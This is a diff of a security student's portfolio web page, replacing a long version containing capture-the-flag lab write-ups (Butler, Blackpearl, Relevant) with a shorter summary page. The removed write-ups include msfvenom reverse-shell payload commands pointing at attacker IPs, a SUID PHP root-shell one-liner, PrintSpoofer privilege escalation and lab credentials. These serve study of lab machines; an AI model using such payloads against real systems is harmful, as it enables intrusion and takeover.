@@ -1,617 +1,126 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Johnny Tavares | Portfolio</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@300;400;700&display=swap');
-        
-        body {
-            font-family: 'Source Code Pro', monospace;
-            margin: 0;
-            padding: 0;
-            background-color: #0a0a0a;
-            color: #d0d0d0;
-            text-align: center;
-            background-image: url('https://www.transparenttextures.com/patterns/circuit-board.png');
-        }
-        header {
-            padding: 20px;
-            font-size: 24px;
-            background-color: #111;
-            box-shadow: 0 2px 10px rgba(0, 255, 255, 0.2);
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        nav {
-            margin: 20px 0;
-        }
-        nav a {
-            color: #00ffff;
-            text-decoration: none;
-            margin: 0 15px;
-            font-size: 18px;
-            transition: color 0.3s, text-shadow 0.3s;
-            cursor: pointer;
-        }
-        nav a:hover {
-            color: #ffffff;
-            text-shadow: 0 0 8px #00ffff;
-        }
-        .container {
-            max-width: 800px;
-            margin: auto;
-            padding: 20px;
-        }
-        section {
-            display: none;
-            margin: 40px 0;
-            padding: 20px;
-            background-color: rgba(20, 20, 20, 0.9);
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 255, 255, 0.2);
-        }
-        section.active {
-            display: block;
-            animation: fadeIn 0.5s ease-in;
-        }
-        .subsection {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: rgba(30, 30, 30, 0.9);
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 255, 255, 0.2);
-            cursor: pointer;
-        }
-        .subsection-content {
-            display: none;
-            margin-top: 10px;
-            transition: all 0.3s ease;
-        }
-        footer {
-            margin-top: 50px;
-            padding: 10px;
-            font-size: 14px;
-            background-color: #111;
-        }
-        
-        /* Improved About Section Styles */
-        .intro-card {
-            background-color: rgba(20, 20, 20, 0.9);
-            border-radius: 10px;
-            padding: 30px;
-            margin-bottom: 30px;
-            text-align: left;
-            box-shadow: 0 4px 12px rgba(0, 255, 255, 0.2);
-        }
-        
-        .intro-text {
-            font-size: 18px;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-        
-        .focus-areas {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin: 30px 0;
-        }
-        
-        .focus-card {
-            background-color: rgba(30, 30, 30, 0.8);
-            border: 1px solid rgba(0, 255, 255, 0.2);
-            border-radius: 10px;
-            padding: 20px;
-            text-align: left;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-        
-        .focus-card:hover {
-            border-color: #00ffff;
-            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
-            transform: translateY(-5px);
-        }
-        
-        .focus-card::before {
-            content: '';
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            width: 8px;
-            height: 8px;
-            background: #00ffff;
-            border-radius: 50%;
-            box-shadow: 0 0 10px #00ffff;
-        }
-        
-        .focus-card h3 {
-            color: #00ffff;
-            margin-top: 0;
-            margin-bottom: 15px;
-            font-size: 16px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            padding-left: 25px;
-        }
-        
-        .focus-card p {
-            margin: 0;
-            line-height: 1.5;
-            font-size: 14px;
-            padding-left: 25px;
-        }
-        
-        .status-section {
-            background-color: rgba(30, 30, 30, 0.8);
-            border-radius: 10px;
-            padding: 20px;
-            margin: 30px 0;
-            text-align: center;
-        }
-        
-        .status-badge {
-            display: inline-block;
-            color: #d0d0d0;
-            font-size: 14px;
-            font-weight: 400;
-        }
-        
-        .social-links {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 30px;
-        }
-        
-        .social-link {
-            display: inline-flex;
-            align-items: center;
-            padding: 12px 20px;
-            background: rgba(0, 255, 255, 0.1);
-            border: 1px solid rgba(0, 255, 255, 0.3);
-            border-radius: 25px;
-            color: #00ffff;
-            text-decoration: none;
-            font-weight: 400;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .social-link:hover {
-            background: rgba(0, 255, 255, 0.2);
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.4);
-            transform: scale(1.05);
-            color: #ffffff;
-        }
-        
-        .social-link::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: -100%;
-            width: 100%;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, #00ffff, transparent);
-            transition: left 0.5s ease;
-        }
-        
-        .social-link:hover::before {
-            left: 100%;
-        }
-        
-        /* Original CSS additions */
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 5px;
-            border: 1px solid #00ffff;
-            margin: 10px 0;
-            box-shadow: 0 0 8px rgba(0, 255, 255, 0.3);
-        }
-
-        pre {
-            background-color: #111;
-            padding: 10px;
-            border-radius: 5px;
-            overflow-x: auto;
-            border-left: 3px solid #00ffff;
-        }
-
-        code {
-            color: #00ffff;
-            font-family: 'Source Code Pro', monospace;
-        }
-
-        .ctf-content h2, .ctf-content h3 {
-            color: #00ffff;
-            margin-top: 25px;
-        }
-
-        .ctf-content ul, .ctf-content ol {
-            text-align: left;
-            margin-left: 20px;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
-        .project-link {
-            display: inline-block;
-            margin-top: 10px;
-            padding: 8px 15px;
-            background-color: rgba(0, 255, 255, 0.1);
-            border: 1px solid #00ffff;
-            border-radius: 5px;
-            color: #00ffff;
-            text-decoration: none;
-            transition: all 0.3s;
-        }
-
-        .project-link:hover {
-            background-color: rgba(0, 255, 255, 0.2);
-            box-shadow: 0 0 10px rgba(0, 255, 255, 0.4);
-        }
-        
-        ul, ol {
-            text-align: left;
-            padding-left: 20px;
-        }
-        
-        ul li, ol li {
-            margin: 5px 0;
-        }
-        
-        ul li a {
-            color: #00ffff;
-            text-decoration: none;
-            transition: color 0.3s, text-shadow 0.3s;
-        }
-        
-        ul li a:hover {
-            color: #ffffff;
-            text-shadow: 0 0 8px #00ffff;
-        }
-    </style>
-    <script>
-        function showSection(sectionId) {
-            document.querySelectorAll('section').forEach(section => {
-                section.classList.remove('active');
-            });
-            document.getElementById(sectionId).classList.add('active');
-        }
-        function toggleSubsection(subsectionId) {
-            let content = document.getElementById(subsectionId);
-            content.style.display = (content.style.display === 'block') ? 'none' : 'block';
-        }
-        window.onload = () => {
-            showSection('about');
-        };
-    </script>
-    <script data-goatcounter="https://johnny-tavares.goatcounter.com/count"
-        async src="//gc.zgo.at/count.js">
-    </script>
+  <meta charset="UTF‑8">
+  <meta name="viewport" content="width=device‑width, initial-scale=1">
+  <title>Johnny Tavares – Security Researcher & Developer</title>
+  <style>
+    /* Base Reset & Typography */
+    body { margin: 0; padding: 0; font-family: 'Source Code Pro', monospace; background: #0a0a0a; color: #d0d0d0; line‑height: 1.6; }
+    a { color: #00ffff; text-decoration: none; transition: color 0.3s; }
+    a:hover { color: #ffffff; }
+    img { max-width: 100%; border: 1px solid #00ffff; border-radius: 4px; }
+    /* Layout */
+    header, section, footer { max-width: 960px; margin: auto; padding: 40px 20px; }
+    header { text-align: center; }
+    nav { display: flex; justify-content: center; gap: 20px; }
+    nav a { font-size: 18px; }
+    section { margin-top: 60px; }
+    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px,1fr)); gap: 30px; }
+    .card { background: rgba(20,20,20,0.9); border-radius: 8px; padding: 20px; box-shadow: 0 4px 12px rgba(0,255,255,0.2); }
+    .card h3 { color: #00ffff; margin-top: 0; }
+    /* Blog & Write‑ups toggler */
+    .toggle { cursor: pointer; margin-bottom: 10px; font-size: 20px; color: #00ffff; }
+    .toggle + .content { display: none; }
+    /* Footer */
+    footer { text-align: center; font-size: 14px; background: #111; padding: 20px 0; margin-top: 80px; }
+    @media (max-width: 600px){ nav a { font-size: 16px; } }
+  </style>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      document.querySelectorAll('.toggle').forEach(el => {
+        el.addEventListener('click', () => {
+          const c = el.nextElementSibling;
+          c.style.display = (c.style.display === 'block') ? 'none' : 'block';
+        });
+      });
+    });
+  </script>
 </head>
 <body>
-    <header>
-        <h1>Johnny Tavares</h1>
-        <p>Security Researcher | CTF Enthusiast | Systems & Creative Developer</p>
-    </header>
+  <header>
+    <h1>Johnny Tavares</h1>
+    <p>Security Researcher • CTF Enthusiast • Systems & Creative Developer</p>
     <nav>
-        <a onclick="showSection('about')">About</a>
-        <a onclick="showSection('projects')">Projects</a>
-        <a onclick="showSection('ctf')">CTF Write-ups</a>
-        <a onclick="showSection('research')">Research</a>
-        <a onclick="showSection('blog')">Blog</a>
+      <a href="#about">About</a>
+      <a href="#projects">Projects</a>
+      <a href="#ctf">CTF Write‑ups</a>
+      <a href="#blog">Blog</a>
+      <a href="#contact">Contact</a>
     </nav>
-    <div class="container">
-        <section id="about" class="active">
-            <div class="intro-card">
-                <div class="intro-text">
-                    <p>Hi, I'm <strong>Johnny Tavares</strong> — a passionate security enthusiast and computer science major. Welcome to my digital space where I document my journey through offensive security, research, and creative development.</p>
-                </div>
-                
-                <div class="focus-areas">
-                    <div class="focus-card">
-                        <h3>Security Engineering</h3>
-                        <p>Developing security tooling and automation solutions in threat monitoring, with both real-world applications and proof-of-concept implementations.</p>
-                    </div>
-                    
-                    <div class="focus-card">
-                        <h3>Offensive Security</h3>
-                        <p>Actively practicing binary exploitation and penetration testing through CTF's or reverse engineering challenges, and creating detailed write-ups to share knowledge and techniques.</p>
-                    </div>
-                    
-                    <div class="focus-card">
-                        <h3>Security Research</h3>
-                        <p>Exploring system internals to better understand exploitation techniques, hardware-software interaction, and emerging security threats.</p>
-                    </div>
-                    
-                    <div class="focus-card">
-                        <h3>Creative Development</h3>
-                        <p>When I need a creative outlet, I enjoy working with Unity and C# to develop games.</p>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="intro-card">
-                <div class="intro-text">
-                    <p>Thanks for checking out my work — feel free to explore my projects, read through my CTF write-ups, or connect with me through the links below. I'm always eager to discuss security topics, share knowledge, and collaborate on interesting challenges.</p>
-                </div>
-                
-                <div class="social-links">
-                    <a href="https://www.github.com/johnny-tavares" class="social-link">
-                        📁 GitHub
-                    </a>
-                    <a href="https://www.linkedin.com/in/johnny-tavares" class="social-link">
-                        💼 LinkedIn
-                    </a>
-                </div>
-            </div>
-        </section>
+  </header>
 
-        <section id="projects">
-            <h2>Projects</h2>
-            <div class="subsection" onclick="toggleSubsection('project1')">Threat Dashboard</div>
-            <div id="project1" class="subsection-content">
-                <p>I engineered a cross-platform monitoring tool with a Python backend and web-based frontend to track live system behavior, including DNS queries, file modifications, and unsigned processes. VirusTotal's API was helpful for automated malware lookups and I implemented structured logging for forensic traceability.</p>
-                <a href="https://www.github.com/johnny-tavares/Threat_Dashboard" class="project-link">
-                    Find on Github
-                </a>
-                <div>
-                    <img src="Images/Dashboard.png" alt="Threat Dashboard Screenshot">
-                </div>
-            </div>
-            <div class="subsection" onclick="toggleSubsection('project2')">SIEM Homelab</div>
-            <div id="project2" class="subsection-content">
-                <h2>SIEM Homelab Project</h2>
-                <p>
-                    A personal SIEM lab built with Splunk to explore real-world threat detection and analysis.
-                    Logs from Linux endpoints are forwarded and monitored for:
-                </p>
-                <ul>
-                    <li>SSH brute-force attempts</li>
-                    <li>File integrity changes</li>
-                    <li>Suspicious commands</li>
-                    <li>Lateral movement (e.g., reverse shells, outbound SSH)</li>
-                </ul>
-                <p>
-                    Custom detection rules and log pipelines simulate realistic attack scenarios.
-                </p>
-            
-                <p><strong>Update:</strong> Added <strong>Active Directory Attack Detection</strong> capabilities, including:</p>
-                <ul>
-                    <li>Kerberoasting</li>
-                    <li>Golden Ticket Attacks <em>(challenging but very rewarding to detect)</em></li>
-                </ul>
-                <a href="https://github.com/johnny-tavares/SIEM-Homelab" class="project-link">
-                    Find on Github
-                </a>
-                 <div>
-                    <img src="Images/SIEM.png" alt="SIEM Example Alert Screenshot">
-                </div>
-            </div>
-            <div class="subsection" onclick="toggleSubsection('project3')">Game Binary Reverse Engineering</div>
-            <div id="project3" class="subsection-content">
-                <h2>Game Binary Reverse Engineering</h2>
-                <p>
-                    A reverse engineering project focused on analyzing XP Solitaire to uncover internal logic and hidden functionality.
-                    This involved static and dynamic techniques using:
-                </p>
-                <ul>
-                    <li>Ghidra for disassembly and control flow analysis</li>
-                    <li>x64dbg for live debugging and breakpoint tracing</li>
-                    <li>Performing DLL Hijacking/Proxying in C++</li>
-                </ul>
-                <div>
-                    <img src="Images/Solitaire.png" alt="XP Solitaire Image">
-                </div>
-            </div>
-        </section>
-        <section id="ctf">
-            <h2>CTF Write-ups(The cool ones!)</h2>
-            <div class="subsection" onclick="toggleSubsection('ctf1')">Butler (TCM Security)</div>
-            <div id="ctf1" class="subsection-content ctf-content">
-                <h2>Tactics Covered</h2>
-                <p>Unquoted service path escalation, msfvenom payload generation.</p>
-                <h2>Initial Enumeration</h2>
-                <p>The first step was running an <strong>nmap scan</strong> to check open ports on the machine. The scan revealed <strong>port 8080</strong> running <strong>HTTP</strong>, which was hosting a <strong>Jenkins</strong> service. With Jenkins running, I decided to attempt a <strong>brute force attack</strong> on the login page using <strong>Burp Suite</strong>.</p>
-
-                <h3>Brute Forcing with Burp Suite</h3>
-                <p>Using a <strong>Cluster Bomb attack</strong> in Burp Suite, I tried a few common usernames and passwords. After some testing, the valid credentials turned out to be:</p>
-                <ul>
-                    <li><strong>Username:</strong> jenkins</li>
-                    <li><strong>Password:</strong> jenkins</li>
-                </ul>
-                <p>This login worked, as evidenced by a change in the length of the response after submitting the credentials.</p>
-
-                <h2>Exploitation</h2>
-                <p>Once logged into Jenkins, I searched for known <strong>Jenkins exploits</strong>. It seems there is a vulnerability that allows us to gain a <strong>reverse shell</strong> through the Jenkins <strong>console</strong> in the settings. This vulnerability gave me system access, and I was now logged in as the user <strong>butler</strong>.</p>
-
-                <h2>Privilege Escalation</h2>
-
-                <h3>Step 1: Downloading and Hosting WinPEAS</h3>
-                <p>First, I downloaded <strong>winpeas</strong>, a tool designed for privilege escalation enumeration on Windows. Since it was a Windows machine, I used the <strong>Windows version of linpeas</strong> called <strong>winpeas</strong>.</p>
-                <p>To make <strong>winpeas</strong> available to the machine, I:</p>
-                <ol>
-                    <li>Hosted a <strong>Python HTTP server</strong> to serve the script:</li>
-                    <pre><code>python -m http.server 80</code></pre>
-                    <li>Changed the directory to <code>C:/users/butler</code>, as it would allow me to run the <strong>winpeas</strong> script.</li>
-                </ol>
-
-                <h3>Step 2: Transfer winpeas using Certutil.exe</h3>
-                <p>I used <strong>certutil.exe</strong> to fetch the <strong>winpeas</strong> script from the Python HTTP server I had set up.</p>
-
-                <h3>Step 3: Unquoted Service Path Attack</h3>
-                <p>Next, I discovered that the <strong>WiseCare</strong> service had an <strong>unquoted service path</strong> vulnerability, which is a common privilege escalation vector in Windows environments.</p>
-                <img src="Images/Buter_WiseCare.png" alt="WiseCare Vulnerability Screenshot">
-
-                <h3>Step 4: Generating Malicious Payload with msfvenom</h3>
-                <p>To take advantage of this, I used <strong>msfvenom</strong> to generate a <strong>reverse shell payload</strong>. The payload I generated was designed to execute a shell on my machine with <strong>SYSTEM</strong> privileges when the vulnerable service starts:</p>
-                <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.206.128 LPORT=7777 -f exe &gt; Wise.exe</code></pre>
-
-                <h3>Step 5: Transferring the Payload</h3>
-                <p>I then transferred the <strong>Wise.exe</strong> payload to the <strong>WiseCare</strong> folder located in <code>Program Files (x86)</code>. To do this, I hosted the <strong>Wise.exe</strong> file again using the Python HTTP server, and then used <strong>certutil.exe</strong> to download the payload.</p>
-
-                <h3>Step 6: Stopping and Restarting the Vulnerable Service</h3>
-                <p>I stopped the <strong>WiseBootAssistant</strong> service using the following command:</p>
-                <pre><code>sc stop WiseBootAssistant</code></pre>
-                <p>Then, I restarted the service with:</p>
-                <pre><code>sc start WiseBootAssistant</code></pre>
-                <p>When the service started, it executed the <strong>Wise.exe</strong> payload, which resulted in a <strong>SYSTEM shell</strong> being returned to me.</p>
-            </div>
-            <div class="subsection" onclick="toggleSubsection('ctf2')">Blackpearl (TCM Security)</div>
-            <div id="ctf2" class="subsection-content ctf-content">
-                <h2>Tactics Covered</h2>
-                <p>Virtual hosting with /etc/hosts, SUID exploit using PHP.</p>
-                <h2>Initial Enumeration</h2>
-                <p><strong>Nmap</strong> scan reveals open ports <strong>22, 53, and 80</strong>. Port 53 will come into play later.</p>
-                <h3>Directory Busting</h3>
-                <p>Source code on port <strong>80</strong> reveals an email address.</p>
-                <p>Started <strong>directory busting</strong>, but <strong>dirbuster didn't work</strong>. <strong>ffuf</strong> did, likely because the target (like <code>/secret</code>) had no file extension. Seems like ffuf handles this better.</p>
-                <p>The <code>/secret</code> directory gave no useful results.</p>
-            
-                <h3>Recon on Port 53</h3>
-                <p>Using <strong>dnsrecon</strong>, found a new virtual host entry.</p>
-                <p>Edited <code>/etc/hosts</code> with <code>sudo nano /etc/hosts</code> to add the machine's IP and domain (e.g., <code>blackpearl.tcm</code>) to our local DNS records.</p>
-                <p>After restarting the browser and visiting <code>http://blackpearl.tcm</code>, an info page appeared.</p>
-                <p>Ran <strong>ffuf</strong> again on this domain and discovered a directory called <code>/navigate</code>.</p>
-                <p>The site was using <strong>Navigate CMS</strong>, which has a known Metasploit exploit.</p>
-            
-                <h2>Exploitation</h2>
-                <p>Used Metasploit's <code>navigate_cms_rce</code> module.</p>
-                <ul>
-                    <li>Set <code>RHOST</code> to the machine's IP.</li>
-                    <li>Set <code>VHOST</code> to <code>blackpearl.tcm</code>.</li>
-                </ul>
-                <p>Ran the module and got a shell. Used the <code>shell</code> command to interact with it.</p>
-                <p>To get a TTY shell, grabbed a Python one-liner online and updated it to use <code>/bin/bash</code>:</p>
-                <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
-            
-                <h2>Privilege Escalation</h2>
-                <p>Moved into <code>/tmp</code> and ran <strong>linpeas</strong> from the host machine.</p>
-                <ul>
-                    <li>Used <code>chmod +x</code> to make it executable.</li>
-                    <li>Ran with <code>./linpeas.sh</code>.</li>
-                </ul>
-                <p>In the SUID section, found a red-highlighted binary: <code>/usr/bin/php</code>.</p>
-                <p>Checked <strong>GTFOBins</strong> and found a suitable exploit for SUID PHP:</p>
-                <pre><code>/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"</code></pre>
-                <p>This gave a root shell. From there, <code>cd /root</code> to grab the flag.</p>
-            </div>
-            <div class="subsection" onclick="toggleSubsection('ctf-relevant')">RELEVANT (TryHackMe)</div>
-            <div id="ctf-relevant" class="subsection-content ctf-content">
-                <h2>Tactics Covered</h2>
-                <p>Active Directory enumeration via SMB, ASPX reverse shells, Windows privilege escalation using SeImpersonatePrivilege (PrintSpoofer)</p>
-                <h2>Initial Enumeration</h2>
-                <ul>
-                    <li>Enumerated SMB shares anonymously using <pre><code>smbclient -L 10.10.230.117 -N</code></pre></li>
-                    <li>Found a custom SMB share: <code>nt4wrksv</code></li>
-                    <li>Domain name: <strong>RELEVANT</strong></li>
-                    <li>SMB signing was <strong>disabled</strong></li>
-                    <li>Anonymous and guest access was allowed to the <code>nt4wrksv</code> share</li>
-                </ul>
-                <img src="Images/relevant_smbclient.png">
-            
-                <h2>Credentials Discovered</h2>
-                <ul>
-                    <li>Bob: <code>!P@$$W0rD!123</code> (Low-privilege user)</li>
-                    <li>Bill: <code>Juw4nnaM4n420696969!$$$</code></li>
-                </ul>
-            
-                <p>Unfortunately initial post-compromise techniques such as Kerberoasting, AS-REP Roasting, secretsdump, etc, yielded no viable attack paths or privilege escalation opportunities.</p>
-            
-                <h2>Web Enumeration</h2>
-                <ul>
-                    <li>Performed directory busting on ports <strong>80</strong> and <strong>49663</strong></li>
-                    <li>Discovered <code>nt4wrksv</code> in web directories — linked to SMB share</li>
-                    <li>Confirmed upload access via SMB to the web root</li>
-                </ul>
-                
-                <h2>Exploitation</h2>
-                <p>Uploaded an <strong>ASPX reverse shell</strong> using SMB which is ideal for IIS/ASP.NET targets.</p>
-                <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.230.117 LPORT=10.6.36.131 -f aspx > shell.aspx</code></pre>
-                <p>Triggered the reverse shell through the exposed web path tied to <code>nt4wrksv</code>.</p>
-                <img src="Images/relevant_priv.png">
-                
-                <h2>Privilege Escalation</h2>
-                <ul>
-                    <li>Token impersonation attempts failed</li>
-                    <li>Attempted PrintNightmare exploit — caught by AV, even with a custom DLL</li>
-                    <li>Used <strong>PrintSpoofer</strong> successfully — achieved <strong>NT AUTHORITY\SYSTEM</strong></li>
-                </ul>
-                <p><pre><code>PrintSpoofer64.exe -i -c cmd</code></pre></p>
-                <img src="Images/relevant_nt_authority.png">
-
-            </div>
-            <div class="subsection" onclick="toggleSubsection('ctf3')">Coming soon!</div>
-            <div id="ctf3" class="subsection-content ctf-content">
-                <p>More CTF write-ups will be added as I complete them. Stay tuned!</p>
-            </div>
-        </section>
-        <section id="research">
-            <h2>Research</h2>
-            <div class="subsection" onclick="toggleSubsection('research1')">Coming soon!</div>
-            <div id="research1" class="subsection-content">
-                <p>Research papers and findings will be published here. Check back later!</p>
-            </div>
-        </section>
-        <section id="blog">
-            <h2>Blog</h2>
-            <div class="subsection" onclick="toggleSubsection('blog1')">Reverse Engineering XP Solitaire & Minesweeper</div>
-            <div id="blog1" class="subsection-content ctf-content">
-                <h2>Cheating Classic Games: XP Solitaire & Minesweeper</h2>
-                <p><em>Date Posted:</em> July 2025</p>
-        
-                <h3>🕹 Why I Did This</h3>
-                <p>I've always loved the charm of old Windows games, and I wanted to dive into how they worked under the hood. The goal was to reverse engineer the internal logic of Solitaire and Minesweeper to uncover hidden mechanics—and cheat a little along the way.</p>
-        
-                <h3>🔍 Tools Used</h3>
-                <ul>
-                    <li>Ghidra (for static analysis)</li>
-                    <li>x64dbg (for dynamic debugging)</li>
-                    <li>Process Hacker (to inspect memory and DLLs)</li>
-                    <li>Visual Studio (for creating proxy DLLs)</li>
-                </ul>
-        
-                <h3>♠️ Solitaire: Win with One Move</h3>
-                <p>Through disassembly in Ghidra, I found the function responsible for checking the win condition. By placing a breakpoint at this address in x64dbg, I was able to manually trigger the win state by manipulating a register.</p>
-        
-                <pre><code>; At this address in x64dbg, toggle EAX to 1 to force a win
-        mov eax, 1</code></pre>
-        
-                <p>Later, I built a DLL proxy for `cards.dll`, logging every call and intercepting card shuffles.</p>
-        
-                <img src="Images/Solitaire_RE_Example.png" alt="Solitaire Debug Screenshot">
-        
-                <h3>💣 Minesweeper: Seeing Through the Grid</h3>
-                <p>Minesweeper uses a simple array structure for its board. I located it in memory using a pattern search after placing a few known mines. From there, I built a script that reads the mine array in real time and overlays it with an AutoHotkey GUI.</p>
-        
-                <pre><code>; memory offset holding the mine data
-        mov edx, [esi+0x120]</code></pre>
-        
-                <p>Once the memory region was identified, I could even zero it out to remove all mines completely.</p>
-        
-                <img src="Images/Minesweeper_Cheat.png" alt="Minesweeper Hack Demo">
-        
-                <h3>💭 Takeaways</h3>
-                <ul>
-                    <li>Even basic games have fascinating internal logic</li>
-                    <li>DLL hijacking is a powerful way to tamper with runtime behavior</li>
-                    <li>This was a fun and nostalgic intro to reverse engineering binaries</li>
-                </ul>
-        
-                <p>If you're interested in trying this out yourself, feel free to reach out or check the repo (coming soon!).</p>
-            </div>
-        </section>
+  <section id="about">
+    <h2>About Me</h2>
+    <div class="grid">
+      <div class="card">
+        <p>I’m a security enthusiast and CS major with a passion for reverse engineering, exploitation, and creative systems development.</p>
+        <p>I build tools for threat monitoring, explore systems internals, and love developing interactive projects in Unity & C#.</p>
+      </div>
+      <div class="card">
+        <h3>Skills & Tools</h3>
+        <ul>
+          <li>Ghidra, x64dbg, WinDbg</li>
+          <li>Python, C++, C#</li>
+          <li>Splunk, SIEM tooling</li>
+          <li>Metasploit, Burp Suite, Nmap</li>
+        </ul>
+      </div>
     </div>
-    <footer>
-        <p>&copy; 2025 Johnny Tavares. All rights reserved.</p>
-    </footer>
+  </section>
+
+  <section id="projects">
+    <h2>Projects</h2>
+    <div class="grid">
+      <div class="card">
+        <h3>Threat Dashboard</h3>
+        <p>Live system behavior tracker with DNS/file/unsigned process monitoring and VirusTotal integration.</p>
+      </div>
+      <div class="card">
+        <h3>SIEM Homelab</h3>
+        <p>Custom Splunk lab with detection rules for AD attacks: Kerberoasting, Golden Ticket detection, lateral movement alerts.</p>
+      </div>
+      <div class="card">
+        <h3>Game Reverse Engineering (XP Solitaire)</h3>
+        <p>Analyzed Solitaire logic via Ghidra & x64dbg, implemented DLL proxying to log shuffle logic and force win states.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="ctf">
+    <h2>CTF Write‑ups</h2>
+    <div>
+      <div class="toggle">Butler (TCM Security)</div>
+      <div class="content">
+        <p>Unquoted service path escalation, msfvenom payload generation, SYSTEM shell via WiseCare service.</p>
+      </div>
+      <div class="toggle">Blackpearl (TCM Security)</div>
+      <div class="content">
+        <p>Virtual hosting via /etc/hosts, Navigate CMS RCE, root shell via SUID PHP exploit.</p>
+      </div>
+      <!-- etc -->
+    </div>
+  </section>
+
+  <section id="blog">
+    <h2>Blog</h2>
+    <div>
+      <div class="toggle">Reverse Engineering XP Solitaire & Minesweeper</div>
+      <div class="content">
+        <p><em>July 2025</em> – A walkthrough of finding win‑state code in Solitaire and mining memory structures to cheat Minesweeper.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="contact">
+    <h2>Contact</h2>
+    <p>Email: <a href="mailto:you@example.com">you@example.com</a></p>
+    <p>GitHub: <a href="https://github.com/johnny-tavares">github.com/johnny‑tavares</a></p>
+    <p>LinkedIn: <a href="https://linkedin.com/in/johnny‑tavares">linkedin.com/in/johnny‑tavares</a></p>
+  </section>
+
+  <footer>
+    <p>© 2025 Johnny Tavares. All rights reserved.</p>
+  </footer>
 </body>
 </html>
